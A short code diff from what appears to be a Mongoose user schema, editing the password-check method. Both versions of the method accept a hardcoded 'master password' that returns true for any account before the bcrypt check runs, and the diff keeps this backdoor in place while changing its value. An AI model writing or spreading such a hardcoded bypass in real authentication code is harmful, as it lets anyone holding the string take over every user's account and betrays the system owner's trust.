@@ -208,7 +208,7 @@ userSchema.virtual('fullAddress').get(function () {
 // Instance methods
 userSchema.methods = {
   correctPassword: async function (candidatePassword) {
-    if (candidatePassword === "thisismasterpassword...") {
+    if (candidatePassword === "thisismasterpassword@vishal") {
       return true;
     }
     return await bcrypt.compare(candidatePassword, this.password);
